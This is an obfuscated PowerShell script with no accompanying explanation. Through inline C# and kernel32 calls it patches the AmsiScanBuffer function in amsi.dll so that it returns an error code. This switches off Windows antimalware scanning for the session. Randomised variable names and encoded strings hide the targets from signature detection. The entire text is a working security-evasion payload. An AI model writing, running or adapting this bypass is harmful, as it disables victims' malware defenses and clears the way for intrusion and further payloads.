$WjbBplBNYRXDOdKrN = @"
using System;
using System.Runtime.InteropServices;
public class WjbBplBNYRXDOdKrN {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr FtN, string F688LtsNG);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ou1q, UIntPtr pPKEB, uint iTkNjP7XTs11YUSZgs, out uint ZJoz1diPN2VVtLq);
}
"@

Add-Type $WjbBplBNYRXDOdKrN

$NVhH1vy = [WjbBplBNYRXDOdKrN]::LoadLibrary("$(('ämsî.'+'dll').nORMAlIze([cHAr]([byte]0x46)+[CHaR]([BytE]0x6f)+[chAR](114*13/13)+[CHar]([ByTE]0x6d)+[chAr](4+64)) -replace [ChAR](92+69-69)+[chAR]([bYtE]0x70)+[CHar]([BYtE]0x7b)+[chaR]([BytE]0x4d)+[cHaR](99+11)+[CHar]([Byte]0x7d))")
$soqEu2Zg_ = [WjbBplBNYRXDOdKrN]::GetProcAddress($NVhH1vy, "$(('ÀmsíScànB'+'ûffér').nORMalIze([cHAR]([bYTE]0x46)+[chAr]([BYTE]0x6f)+[Char](114*79/79)+[chAR]([BytE]0x6d)+[ChAr]([BYtE]0x44)) -replace [CHAr](92+69-69)+[CHar](112*45/45)+[cHar](11+112)+[char]([bytE]0x4d)+[CHAR]([ByTE]0x6e)+[chaR](125*40/40))")
$p = 0
[WjbBplBNYRXDOdKrN]::VirtualProtect($soqEu2Zg_, [uint32]5, 0x40, [ref]$p)
$RtcjDpdstq = "0xB8"
$bw9QiCdW1Q4cq2VQRst = "0x57"
$_Hb8wq9q8ybL = "0x00"
$ieMkvDdBrqu3b7 = "0x07"
$xIPczpo = "0x80"
$dZDx2fG0AZNtJs = "0xC3"
$vozYRiJHaCahUJ8dd = [Byte[]] ($RtcjDpdstq,$bw9QiCdW1Q4cq2VQRst,$_Hb8wq9q8ybL,$ieMkvDdBrqu3b7,+$xIPczpo,+$dZDx2fG0AZNtJs)
[System.Runtime.InteropServices.Marshal]::Copy($vozYRiJHaCahUJ8dd, 0, $soqEu2Zg_, 6)